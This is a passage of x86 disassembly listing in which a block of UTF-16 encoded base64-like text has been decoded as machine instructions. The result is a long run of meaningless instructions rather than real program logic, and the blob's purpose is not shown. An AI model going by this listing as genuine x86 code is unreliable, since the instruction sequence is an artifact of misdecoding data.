  4088e6:	00 4e 00             	add    %cl,0x0(%esi)
  4088e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ea:	00 47 00             	add    %al,0x0(%edi)
  4088ed:	63 00                	arpl   %eax,(%eax)
  4088ef:	31 00                	xor    %eax,(%eax)
  4088f1:	63 00                	arpl   %eax,(%eax)
  4088f3:	55                   	push   %ebp
  4088f4:	00 36                	add    %dh,(%esi)
  4088f6:	00 50 00             	add    %dl,0x0(%eax)
  4088f9:	76 00                	jbe    0x4088fb
  4088fb:	33 00                	xor    (%eax),%eax
  4088fd:	4a                   	dec    %edx
  4088fe:	00 49 00             	add    %cl,0x0(%ecx)
  408901:	45                   	inc    %ebp
  408902:	00 78 00             	add    %bh,0x0(%eax)
  408905:	70 00                	jo     0x408907
  408907:	33 00                	xor    (%eax),%eax
  408909:	72 00                	jb     0x40890b
  40890b:	4c                   	dec    %esp
  40890c:	00 49 00             	add    %cl,0x0(%ecx)
  40890f:	38 00                	cmp    %al,(%eax)
  408911:	63 00                	arpl   %eax,(%eax)
  408913:	37                   	aaa
  408914:	00 57 00             	add    %dl,0x0(%edi)
  408917:	43                   	inc    %ebx
  408918:	00 76 00             	add    %dh,0x0(%esi)
  40891b:	55                   	push   %ebp
  40891c:	00 61 00             	add    %ah,0x0(%ecx)
  40891f:	37                   	aaa
  408920:	00 5a 00             	add    %bl,0x0(%edx)
  408923:	43                   	inc    %ebx
  408924:	00 53 00             	add    %dl,0x0(%ebx)
  408927:	51                   	push   %ecx
  408928:	00 4a 00             	add    %cl,0x0(%edx)
  40892b:	64 00 44 00 4f       	add    %al,%fs:0x4f(%eax,%eax,1)
  408930:	00 49 00             	add    %cl,0x0(%ecx)
  408933:	2f                   	das
  408934:	00 66 00             	add    %ah,0x0(%esi)
  408937:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40893b:	5a                   	pop    %edx
  40893c:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  408940:	00 56 00             	add    %dl,0x0(%esi)
  408943:	6d                   	insl   (%dx),%es:(%edi)
  408944:	00 48 00             	add    %cl,0x0(%eax)
  408947:	61                   	popa
  408948:	00 4f 00             	add    %cl,0x0(%edi)
  40894b:	55                   	push   %ebp
  40894c:	00 79 00             	add    %bh,0x0(%ecx)
  40894f:	6c                   	insb   (%dx),%es:(%edi)
  408950:	00 36                	add    %dh,(%esi)
  408952:	00 59 00             	add    %bl,0x0(%ecx)
  408955:	76 00                	jbe    0x408957
  408957:	4b                   	dec    %ebx
  408958:	00 66 00             	add    %ah,0x0(%esi)
  40895b:	6c                   	insb   (%dx),%es:(%edi)
  40895c:	00 58 00             	add    %bl,0x0(%eax)
  40895f:	48                   	dec    %eax
  408960:	00 67 00             	add    %ah,0x0(%edi)
  408963:	4a                   	dec    %edx
  408964:	00 34 00             	add    %dh,(%eax,%eax,1)
  408967:	4e                   	dec    %esi
  408968:	00 47 00             	add    %al,0x0(%edi)
  40896b:	61                   	popa
  40896c:	00 50 00             	add    %dl,0x0(%eax)
  40896f:	4b                   	dec    %ebx
  408970:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  408974:	00 76 00             	add    %dh,0x0(%esi)
  408977:	73 00                	jae    0x408979
  408979:	4a                   	dec    %edx
  40897a:	00 77 00             	add    %dh,0x0(%edi)
  40897d:	70 00                	jo     0x40897f
  40897f:	4d                   	dec    %ebp
  408980:	00 51 00             	add    %dl,0x0(%ecx)
  408983:	44                   	inc    %esp
  408984:	00 72 00             	add    %dh,0x0(%edx)
  408987:	39 00                	cmp    %eax,(%eax)
  408989:	5a                   	pop    %edx
  40898a:	00 70 00             	add    %dh,0x0(%eax)
  40898d:	6e                   	outsb  %ds:(%esi),(%dx)
  40898e:	00 33                	add    %dh,(%ebx)
  408990:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  408994:	00 67 00             	add    %ah,0x0(%edi)
  408997:	65 00 33             	add    %dh,%gs:(%ebx)
  40899a:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40899e:	00 2b                	add    %ch,(%ebx)
  4089a0:	00 70 00             	add    %dh,0x0(%eax)
  4089a3:	48                   	dec    %eax
  4089a4:	00 33                	add    %dh,(%ebx)
  4089a6:	00 47 00             	add    %al,0x0(%edi)
  4089a9:	52                   	push   %edx
  4089aa:	00 66 00             	add    %ah,0x0(%esi)
  4089ad:	4b                   	dec    %ebx
  4089ae:	00 30                	add    %dh,(%eax)
  4089b0:	00 4a 00             	add    %cl,0x0(%edx)
  4089b3:	55                   	push   %ebp
  4089b4:	00 4d 00             	add    %cl,0x0(%ebp)
  4089b7:	6d                   	insl   (%dx),%es:(%edi)
  4089b8:	00 37                	add    %dh,(%edi)
  4089ba:	00 31                	add    %dh,(%ecx)
  4089bc:	00 78 00             	add    %bh,0x0(%eax)
  4089bf:	78 00                	js     0x4089c1
  4089c1:	70 00                	jo     0x4089c3
  4089c3:	35 00 62 00 57       	xor    $0x57006200,%eax
  4089c8:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  4089cc:	00 53 00             	add    %dl,0x0(%ebx)
  4089cf:	2b 00                	sub    (%eax),%eax
  4089d1:	75 00                	jne    0x4089d3
  4089d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d4:	00 66 00             	add    %ah,0x0(%esi)
  4089d7:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  4089db:	46                   	inc    %esi
  4089dc:	00 47 00             	add    %al,0x0(%edi)
  4089df:	74 00                	je     0x4089e1
  4089e1:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  4089e5:	33 00                	xor    (%eax),%eax
  4089e7:	48                   	dec    %eax
  4089e8:	00 6d 00             	add    %ch,0x0(%ebp)
  4089eb:	63 00                	arpl   %eax,(%eax)
  4089ed:	62 00                	bound  %eax,(%eax)
  4089ef:	68 00 77 00 55       	push   $0x55007700
  4089f4:	00 77 00             	add    %dh,0x0(%edi)
  4089f7:	56                   	push   %esi
  4089f8:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  4089fc:	00 72 00             	add    %dh,0x0(%edx)
  4089ff:	6c                   	insb   (%dx),%es:(%edi)
  408a00:	00 48 00             	add    %cl,0x0(%eax)
  408a03:	71 00                	jno    0x408a05
  408a05:	48                   	dec    %eax
  408a06:	00 53 00             	add    %dl,0x0(%ebx)
  408a09:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  408a0d:	75 00                	jne    0x408a0f
  408a0f:	48                   	dec    %eax
  408a10:	00 61 00             	add    %ah,0x0(%ecx)
  408a13:	48                   	dec    %eax
  408a14:	00 43 00             	add    %al,0x0(%ebx)
  408a17:	4d                   	dec    %ebp
  408a18:	00 7a 00             	add    %bh,0x0(%edx)
  408a1b:	71 00                	jno    0x408a1d
  408a1d:	44                   	inc    %esp
  408a1e:	00 57 00             	add    %dl,0x0(%edi)
  408a21:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  408a25:	52                   	push   %edx
  408a26:	00 2f                	add    %ch,(%edi)
  408a28:	00 78 00             	add    %bh,0x0(%eax)
  408a2b:	44                   	inc    %esp
  408a2c:	00 50 00             	add    %dl,0x0(%eax)
  408a2f:	53                   	push   %ebx
  408a30:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  408a34:	00 4a 00             	add    %cl,0x0(%edx)
  408a37:	7a 00                	jp     0x408a39
  408a39:	38 00                	cmp    %al,(%eax)
  408a3b:	62 00                	bound  %eax,(%eax)
  408a3d:	68 00 55 00 67       	push   $0x67005500
  408a42:	00 75 00             	add    %dh,0x0(%ebp)
  408a45:	43                   	inc    %ebx
  408a46:	00 70 00             	add    %dh,0x0(%eax)
  408a49:	59                   	pop    %ecx
  408a4a:	00 33                	add    %dh,(%ebx)
  408a4c:	00 7a 00             	add    %bh,0x0(%edx)
  408a4f:	71 00                	jno    0x408a51
  408a51:	49                   	dec    %ecx
  408a52:	00 43 00             	add    %al,0x0(%ebx)
  408a55:	72 00                	jb     0x408a57
  408a57:	33 00                	xor    (%eax),%eax
  408a59:	6d                   	insl   (%dx),%es:(%edi)
  408a5a:	00 67 00             	add    %ah,0x0(%edi)
  408a5d:	4a                   	dec    %edx
  408a5e:	00 79 00             	add    %bh,0x0(%ecx)
  408a61:	54                   	push   %esp
  408a62:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  408a66:	00 35 00 59 00 69    	add    %dh,0x69005900
  408a6c:	00 4f 00             	add    %cl,0x0(%edi)
  408a6f:	4d                   	dec    %ebp
  408a70:	00 53 00             	add    %dl,0x0(%ebx)
  408a73:	37                   	aaa
  408a74:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  408a78:	00 47 00             	add    %al,0x0(%edi)
  408a7b:	2f                   	das
  408a7c:	00 4b 00             	add    %cl,0x0(%ebx)
  408a7f:	68 00 4e 00 5a       	push   $0x5a004e00
  408a84:	00 58 00             	add    %bl,0x0(%eax)
  408a87:	6a 00                	push   $0x0
  408a89:	54                   	push   %esp
  408a8a:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  408a8e:	00 66 00             	add    %ah,0x0(%esi)
  408a91:	59                   	pop    %ecx
  408a92:	00 39                	add    %bh,(%ecx)
  408a94:	00 4a 00             	add    %cl,0x0(%edx)
  408a97:	78 00                	js     0x408a99
  408a99:	43                   	inc    %ebx
  408a9a:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  408a9e:	00 6e 00             	add    %ch,0x0(%esi)
  408aa1:	7a 00                	jp     0x408aa3
  408aa3:	59                   	pop    %ecx
  408aa4:	00 72 00             	add    %dh,0x0(%edx)
  408aa7:	55                   	push   %ebp
  408aa8:	00 4e 00             	add    %cl,0x0(%esi)
  408aab:	6d                   	insl   (%dx),%es:(%edi)
  408aac:	00 2b                	add    %ch,(%ebx)
  408aae:	00 35 00 4f 00 50    	add    %dh,0x50004f00
  408ab4:	00 5a 00             	add    %bl,0x0(%edx)
  408ab7:	4a                   	dec    %edx
  408ab8:	00 6e 00             	add    %ch,0x0(%esi)
  408abb:	4a                   	dec    %edx
  408abc:	00 39                	add    %bh,(%ecx)
  408abe:	00 36                	add    %dh,(%esi)
  408ac0:	00 59 00             	add    %bl,0x0(%ecx)
  408ac3:	2b 00                	sub    (%eax),%eax
  408ac5:	42                   	inc    %edx
  408ac6:	00 52 00             	add    %dl,0x0(%edx)
  408ac9:	4b                   	dec    %ebx
  408aca:	00 57 00             	add    %dl,0x0(%edi)
  408acd:	76 00                	jbe    0x408acf
  408acf:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  408ad3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ad4:	00 6f 00             	add    %ch,0x0(%edi)
  408ad7:	32 00                	xor    (%eax),%al
  408ad9:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  408add:	39 00                	cmp    %eax,(%eax)
  408adf:	4f                   	dec    %edi
  408ae0:	00 2f                	add    %ch,(%edi)
  408ae2:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  408ae6:	00 48 00             	add    %cl,0x0(%eax)
  408ae9:	43                   	inc    %ebx
  408aea:	00 46 00             	add    %al,0x0(%esi)
  408aed:	37                   	aaa
  408aee:	00 62 00             	add    %ah,0x0(%edx)
  408af1:	7a 00                	jp     0x408af3
  408af3:	51                   	push   %ecx
  408af4:	00 4f 00             	add    %cl,0x0(%edi)
  408af7:	50                   	push   %eax
  408af8:	00 73 00             	add    %dh,0x0(%ebx)
  408afb:	6e                   	outsb  %ds:(%esi),(%dx)
  408afc:	00 63 00             	add    %ah,0x0(%ebx)
  408aff:	74 00                	je     0x408b01
  408b01:	48                   	dec    %eax
  408b02:	00 58 00             	add    %bl,0x0(%eax)
  408b05:	48                   	dec    %eax
  408b06:	00 68 00             	add    %ch,0x0(%eax)
  408b09:	62 00                	bound  %eax,(%eax)
  408b0b:	4d                   	dec    %ebp
  408b0c:	00 51 00             	add    %dl,0x0(%ecx)
  408b0f:	45                   	inc    %ebp
  408b10:	00 32                	add    %dh,(%edx)
  408b12:	00 2b                	add    %ch,(%ebx)
  408b14:	00 78 00             	add    %bh,0x0(%eax)
  408b17:	4d                   	dec    %ebp
  408b18:	00 47 00             	add    %al,0x0(%edi)
  408b1b:	45                   	inc    %ebp
  408b1c:	00 63 00             	add    %ah,0x0(%ebx)
  408b1f:	33 00                	xor    (%eax),%eax
  408b21:	43                   	inc    %ebx
  408b22:	00 33                	add    %dh,(%ebx)
  408b24:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  408b28:	00 2b                	add    %ch,(%ebx)
  408b2a:	00 63 00             	add    %ah,0x0(%ebx)
  408b2d:	73 00                	jae    0x408b2f
  408b2f:	72 00                	jb     0x408b31
  408b31:	75 00                	jne    0x408b33
  408b33:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  408b37:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  408b3b:	6a 00                	push   $0x0
  408b3d:	6a 00                	push   $0x0
  408b3f:	31 00                	xor    %eax,(%eax)
  408b41:	4e                   	dec    %esi
  408b42:	00 36                	add    %dh,(%esi)
  408b44:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  408b48:	00 72 00             	add    %dh,0x0(%edx)
  408b4b:	75 00                	jne    0x408b4d
  408b4d:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  408b51:	2b 00                	sub    (%eax),%eax
  408b53:	4e                   	dec    %esi
  408b54:	00 30                	add    %dh,(%eax)
  408b56:	00 53 00             	add    %dl,0x0(%ebx)
  408b59:	2f                   	das
  408b5a:	00 43 00             	add    %al,0x0(%ebx)
  408b5d:	6c                   	insb   (%dx),%es:(%edi)
  408b5e:	00 35 00 68 00 48    	add    %dh,0x48006800
  408b64:	00 4f 00             	add    %cl,0x0(%edi)
  408b67:	35 00 4b 00 37       	xor    $0x37004b00,%eax
  408b6c:	00 75 00             	add    %dh,0x0(%ebp)
  408b6f:	76 00                	jbe    0x408b71
  408b71:	43                   	inc    %ebx
  408b72:	00 4d 00             	add    %cl,0x0(%ebp)
  408b75:	57                   	push   %edi
  408b76:	00 55 00             	add    %dl,0x0(%ebp)
  408b79:	70 00                	jo     0x408b7b
  408b7b:	75 00                	jne    0x408b7d
  408b7d:	37                   	aaa
  408b7e:	00 79 00             	add    %bh,0x0(%ecx)
  408b81:	57                   	push   %edi
  408b82:	00 56 00             	add    %dl,0x0(%esi)
  408b85:	39 00                	cmp    %eax,(%eax)
  408b87:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  408b8b:	48                   	dec    %eax
  408b8c:	00 6f 00             	add    %ch,0x0(%edi)
  408b8f:	4b                   	dec    %ebx
  408b90:	00 30                	add    %dh,(%eax)
  408b92:	00 49 00             	add    %cl,0x0(%ecx)
  408b95:	34 00                	xor    $0x0,%al
  408b97:	57                   	push   %edi
  408b98:	00 30                	add    %dh,(%eax)
  408b9a:	00 53 00             	add    %dl,0x0(%ebx)
  408b9d:	6a 00                	push   $0x0
  408b9f:	48                   	dec    %eax
  408ba0:	00 6a 00             	add    %ch,0x0(%edx)
  408ba3:	6d                   	insl   (%dx),%es:(%edi)
  408ba4:	00 4d 00             	add    %cl,0x0(%ebp)
  408ba7:	50                   	push   %eax
  408ba8:	00 65 00             	add    %ah,0x0(%ebp)
  408bab:	47                   	inc    %edi
  408bac:	00 34 00             	add    %dh,(%eax,%eax,1)
  408baf:	55                   	push   %ebp
  408bb0:	00 4e 00             	add    %cl,0x0(%esi)
  408bb3:	66 00 66 00          	data16 add %ah,0x0(%esi)
  408bb7:	34 00                	xor    $0x0,%al
  408bb9:	6c                   	insb   (%dx),%es:(%edi)
  408bba:	00 53 00             	add    %dl,0x0(%ebx)
  408bbd:	6d                   	insl   (%dx),%es:(%edi)
  408bbe:	00 5a 00             	add    %bl,0x0(%edx)
  408bc1:	62 00                	bound  %eax,(%eax)
  408bc3:	44                   	inc    %esp
  408bc4:	00 53 00             	add    %dl,0x0(%ebx)
  408bc7:	4d                   	dec    %ebp
  408bc8:	00 69 00             	add    %ch,0x0(%ecx)
  408bcb:	78 00                	js     0x408bcd
  408bcd:	48                   	dec    %eax
  408bce:	00 46 00             	add    %al,0x0(%esi)
  408bd1:	59                   	pop    %ecx
  408bd2:	00 39                	add    %bh,(%ecx)
  408bd4:	00 34 00             	add    %dh,(%eax,%eax,1)
  408bd7:	43                   	inc    %ebx
  408bd8:	00 69 00             	add    %ch,0x0(%ecx)
  408bdb:	73 00                	jae    0x408bdd
  408bdd:	63 00                	arpl   %eax,(%eax)
  408bdf:	6d                   	insl   (%dx),%es:(%edi)
  408be0:	00 65 00             	add    %ah,0x0(%ebp)
  408be3:	42                   	inc    %edx
  408be4:	00 48 00             	add    %cl,0x0(%eax)
  408be7:	36 00 32             	add    %dh,%ss:(%edx)
  408bea:	00 61 00             	add    %ah,0x0(%ecx)
  408bed:	4c                   	dec    %esp
  408bee:	00 36                	add    %dh,(%esi)
  408bf0:	00 58 00             	add    %bl,0x0(%eax)
  408bf3:	78 00                	js     0x408bf5
  408bf5:	48                   	dec    %eax
  408bf6:	00 4b 00             	add    %cl,0x0(%ebx)
  408bf9:	54                   	push   %esp
  408bfa:	00 71 00             	add    %dh,0x0(%ecx)
  408bfd:	61                   	popa
  408bfe:	00 56 00             	add    %dl,0x0(%esi)
  408c01:	47                   	inc    %edi
  408c02:	00 32                	add    %dh,(%edx)
  408c04:	00 53 00             	add    %dl,0x0(%ebx)
  408c07:	33 00                	xor    (%eax),%eax
  408c09:	32 00                	xor    (%eax),%al
  408c0b:	51                   	push   %ecx
  408c0c:	00 31                	add    %dh,(%ecx)
  408c0e:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  408c12:	00 78 00             	add    %bh,0x0(%eax)
  408c15:	61                   	popa
  408c16:	00 2b                	add    %ch,(%ebx)
  408c18:	00 66 00             	add    %ah,0x0(%esi)
  408c1b:	5a                   	pop    %edx
  408c1c:	00 58 00             	add    %bl,0x0(%eax)
  408c1f:	63 00                	arpl   %eax,(%eax)
  408c21:	41                   	inc    %ecx
  408c22:	00 6d 00             	add    %ch,0x0(%ebp)
  408c25:	58                   	pop    %eax
  408c26:	00 56 00             	add    %dl,0x0(%esi)
  408c29:	44                   	inc    %esp
  408c2a:	00 68 00             	add    %ch,0x0(%eax)
  408c2d:	6a 00                	push   $0x0
  408c2f:	52                   	push   %edx
  408c30:	00 7a 00             	add    %bh,0x0(%edx)
  408c33:	51                   	push   %ecx
  408c34:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  408c38:	00 79 00             	add    %bh,0x0(%ecx)
  408c3b:	30 00                	xor    %al,(%eax)
  408c3d:	77 00                	ja     0x408c3f
  408c3f:	34 00                	xor    $0x0,%al
  408c41:	6a 00                	push   $0x0
  408c43:	2b 00                	sub    (%eax),%eax
  408c45:	4e                   	dec    %esi
  408c46:	00 6b 00             	add    %ch,0x0(%ebx)
  408c49:	72 00                	jb     0x408c4b
  408c4b:	35 00 73 00 2f       	xor    $0x2f007300,%eax
  408c50:	00 6b 00             	add    %ch,0x0(%ebx)
  408c53:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  408c57:	7a 00                	jp     0x408c59
  408c59:	70 00                	jo     0x408c5b
  408c5b:	31 00                	xor    %eax,(%eax)
  408c5d:	6a 00                	push   $0x0
  408c5f:	66 00 39             	data16 add %bh,(%ecx)
  408c62:	00 45 00             	add    %al,0x0(%ebp)
  408c65:	4d                   	dec    %ebp
  408c66:	00 71 00             	add    %dh,0x0(%ecx)
  408c69:	32 00                	xor    (%eax),%al
  408c6b:	70 00                	jo     0x408c6d
  408c6d:	31 00                	xor    %eax,(%eax)
  408c6f:	42                   	inc    %edx
  408c70:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  408c74:	00 61 00             	add    %ah,0x0(%ecx)
  408c77:	70 00                	jo     0x408c79
  408c79:	38 00                	cmp    %al,(%eax)
  408c7b:	75 00                	jne    0x408c7d
  408c7d:	47                   	inc    %edi
  408c7e:	00 53 00             	add    %dl,0x0(%ebx)
  408c81:	44                   	inc    %esp
  408c82:	00 7a 00             	add    %bh,0x0(%edx)
  408c85:	67 00 34             	add    %dh,(%si)
  408c88:	00 33                	add    %dh,(%ebx)
  408c8a:	00 45 00             	add    %al,0x0(%ebp)
  408c8d:	54                   	push   %esp
  408c8e:	00 47 00             	add    %al,0x0(%edi)
  408c91:	33 00                	xor    (%eax),%eax
  408c93:	7a 00                	jp     0x408c95
  408c95:	78 00                	js     0x408c97
  408c97:	71 00                	jno    0x408c99
  408c99:	73 00                	jae    0x408c9b
  408c9b:	57                   	push   %edi
  408c9c:	00 39                	add    %bh,(%ecx)
  408c9e:	00 6d 00             	add    %ch,0x0(%ebp)
  408ca1:	62 00                	bound  %eax,(%eax)
  408ca3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca4:	00 31                	add    %dh,(%ecx)
  408ca6:	00 76 00             	add    %dh,0x0(%esi)
  408ca9:	43                   	inc    %ebx
  408caa:	00 48 00             	add    %cl,0x0(%eax)
  408cad:	47                   	inc    %edi
  408cae:	00 73 00             	add    %dh,0x0(%ebx)
  408cb1:	62 00                	bound  %eax,(%eax)
  408cb3:	37                   	aaa
  408cb4:	00 49 00             	add    %cl,0x0(%ecx)
  408cb7:	58                   	pop    %eax
  408cb8:	00 4b 00             	add    %cl,0x0(%ebx)
  408cbb:	34 00                	xor    $0x0,%al
  408cbd:	73 00                	jae    0x408cbf
  408cbf:	35 00 4b 00 45       	xor    $0x45004b00,%eax
  408cc4:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  408cc8:	00 65 00             	add    %ah,0x0(%ebp)
  408ccb:	58                   	pop    %eax
  408ccc:	00 4a 00             	add    %cl,0x0(%edx)
  408ccf:	6a 00                	push   $0x0
  408cd1:	5a                   	pop    %edx
  408cd2:	00 62 00             	add    %ah,0x0(%edx)
  408cd5:	38 00                	cmp    %al,(%eax)
  408cd7:	42                   	inc    %edx
  408cd8:	00 6d 00             	add    %ch,0x0(%ebp)
  408cdb:	79 00                	jns    0x408cdd
  408cdd:	61                   	popa
  408cde:	00 4a 00             	add    %cl,0x0(%edx)
  408ce1:	33 00                	xor    (%eax),%eax
  408ce3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce4:	00 57 00             	add    %dl,0x0(%edi)
  408ce7:	31 00                	xor    %eax,(%eax)
  408ce9:	52                   	push   %edx
  408cea:	00 6a 00             	add    %ch,0x0(%edx)
  408ced:	6e                   	outsb  %ds:(%esi),(%dx)
  408cee:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  408cf2:	00 73 00             	add    %dh,0x0(%ebx)
  408cf5:	71 00                	jno    0x408cf7
  408cf7:	59                   	pop    %ecx
  408cf8:	00 36                	add    %dh,(%esi)
  408cfa:	00 2f                	add    %ch,(%edi)
  408cfc:	00 45 00             	add    %al,0x0(%ebp)
  408cff:	5a                   	pop    %edx
  408d00:	00 45 00             	add    %al,0x0(%ebp)
  408d03:	50                   	push   %eax
  408d04:	00 38                	add    %bh,(%eax)
  408d06:	00 2b                	add    %ch,(%ebx)
  408d08:	00 30                	add    %dh,(%eax)
  408d0a:	00 49 00             	add    %cl,0x0(%ecx)
  408d0d:	48                   	dec    %eax
  408d0e:	00 73 00             	add    %dh,0x0(%ebx)
  408d11:	51                   	push   %ecx
  408d12:	00 59 00             	add    %bl,0x0(%ecx)
  408d15:	68 00 35 00 47       	push   $0x47003500
  408d1a:	00 62 00             	add    %ah,0x0(%edx)
  408d1d:	64 00 4c 00 50       	add    %cl,%fs:0x50(%eax,%eax,1)
  408d22:	00 2f                	add    %ch,(%edi)
  408d24:	00 77 00             	add    %dh,0x0(%edi)
  408d27:	59                   	pop    %ecx
  408d28:	00 57 00             	add    %dl,0x0(%edi)
  408d2b:	68 00 6b 00 72       	push   $0x72006b00
  408d30:	00 39                	add    %bh,(%ecx)
  408d32:	00 43 00             	add    %al,0x0(%ebx)
  408d35:	48                   	dec    %eax
  408d36:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  408d3a:	00 36                	add    %dh,(%esi)
  408d3c:	00 73 00             	add    %dh,0x0(%ebx)
  408d3f:	71 00                	jno    0x408d41
  408d41:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  408d45:	46                   	inc    %esi
  408d46:	00 66 00             	add    %ah,0x0(%esi)
  408d49:	2b 00                	sub    (%eax),%eax
  408d4b:	31 00                	xor    %eax,(%eax)
  408d4d:	34 00                	xor    $0x0,%al
  408d4f:	68 00 6b 00 4f       	push   $0x4f006b00
  408d54:	00 50 00             	add    %dl,0x0(%eax)
  408d57:	65 00 2f             	add    %ch,%gs:(%edi)
  408d5a:	00 43 00             	add    %al,0x0(%ebx)
  408d5d:	4b                   	dec    %ebx
  408d5e:	00 6b 00             	add    %ch,0x0(%ebx)
  408d61:	54                   	push   %esp
  408d62:	00 4f 00             	add    %cl,0x0(%edi)
  408d65:	71 00                	jno    0x408d67
  408d67:	31 00                	xor    %eax,(%eax)
  408d69:	53                   	push   %ebx
  408d6a:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  408d6e:	00 43 00             	add    %al,0x0(%ebx)
  408d71:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  408d75:	42                   	inc    %edx
  408d76:	00 33                	add    %dh,(%ebx)
  408d78:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  408d7c:	00 2b                	add    %ch,(%ebx)
  408d7e:	00 73 00             	add    %dh,0x0(%ebx)
  408d81:	72 00                	jb     0x408d83
  408d83:	6a 00                	push   $0x0
  408d85:	59                   	pop    %ecx
  408d86:	00 36                	add    %dh,(%esi)
  408d88:	00 76 00             	add    %dh,0x0(%esi)
  408d8b:	5a                   	pop    %edx
  408d8c:	00 56 00             	add    %dl,0x0(%esi)
  408d8f:	31 00                	xor    %eax,(%eax)
  408d91:	45                   	inc    %ebp
  408d92:	00 79 00             	add    %bh,0x0(%ecx)
  408d95:	31 00                	xor    %eax,(%eax)
  408d97:	6f                   	outsl  %ds:(%esi),(%dx)
  408d98:	00 36                	add    %dh,(%esi)
  408d9a:	00 6b 00             	add    %ch,0x0(%ebx)
  408d9d:	78 00                	js     0x408d9f
  408d9f:	73 00                	jae    0x408da1
  408da1:	53                   	push   %ebx
  408da2:	00 30                	add    %dh,(%eax)
  408da4:	00 6d 00             	add    %ch,0x0(%ebp)
  408da7:	69 00 54 00 63 00    	imul   $0x630054,(%eax),%eax
  408dad:	6d                   	insl   (%dx),%es:(%edi)
  408dae:	00 6a 00             	add    %ch,0x0(%edx)
  408db1:	5a                   	pop    %edx
  408db2:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  408db6:	00 48 00             	add    %cl,0x0(%eax)
  408db9:	77 00                	ja     0x408dbb
  408dbb:	36 00 37             	add    %dh,%ss:(%edi)
  408dbe:	00 34 00             	add    %dh,(%eax,%eax,1)
  408dc1:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  408dc5:	32 00                	xor    (%eax),%al
  408dc7:	4b                   	dec    %ebx
  408dc8:	00 4a 00             	add    %cl,0x0(%edx)
  408dcb:	77 00                	ja     0x408dcd
  408dcd:	4b                   	dec    %ebx
  408dce:	00 42 00             	add    %al,0x0(%edx)
  408dd1:	59                   	pop    %ecx
  408dd2:	00 65 00             	add    %ah,0x0(%ebp)
  408dd5:	48                   	dec    %eax
  408dd6:	00 61 00             	add    %ah,0x0(%ecx)
  408dd9:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  408ddd:	4c                   	dec    %esp
  408dde:	00 68 00             	add    %ch,0x0(%eax)
  408de1:	78 00                	js     0x408de3
  408de3:	57                   	push   %edi
  408de4:	00 71 00             	add    %dh,0x0(%ecx)
  408de7:	78 00                	js     0x408de9
  408de9:	67 00 47 00          	add    %al,0x0(%bx)
  408ded:	43                   	inc    %ebx
  408dee:	00 63 00             	add    %ah,0x0(%ebx)
  408df1:	6e                   	outsb  %ds:(%esi),(%dx)
  408df2:	00 46 00             	add    %al,0x0(%esi)
  408df5:	47                   	inc    %edi
  408df6:	00 37                	add    %dh,(%edi)
  408df8:	00 2b                	add    %ch,(%ebx)
  408dfa:	00 32                	add    %dh,(%edx)
  408dfc:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  408e00:	00 66 00             	add    %ah,0x0(%esi)
  408e03:	70 00                	jo     0x408e05
  408e05:	34 00                	xor    $0x0,%al
  408e07:	57                   	push   %edi
  408e08:	00 42 00             	add    %al,0x0(%edx)
  408e0b:	4b                   	dec    %ebx
  408e0c:	00 61 00             	add    %ah,0x0(%ecx)
  408e0f:	59                   	pop    %ecx
  408e10:	00 32                	add    %dh,(%edx)
  408e12:	00 77 00             	add    %dh,0x0(%edi)
  408e15:	72 00                	jb     0x408e17
  408e17:	53                   	push   %ebx
  408e18:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  408e1c:	00 6b 00             	add    %ch,0x0(%ebx)
  408e1f:	52                   	push   %edx
  408e20:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  408e24:	00 46 00             	add    %al,0x0(%esi)
  408e27:	4e                   	dec    %esi
  408e28:	00 6e 00             	add    %ch,0x0(%esi)
  408e2b:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  408e2f:	7a 00                	jp     0x408e31
  408e31:	4c                   	dec    %esp
  408e32:	00 45 00             	add    %al,0x0(%ebp)
  408e35:	47                   	inc    %edi
  408e36:	00 49 00             	add    %cl,0x0(%ecx)
  408e39:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  408e3d:	50                   	push   %eax
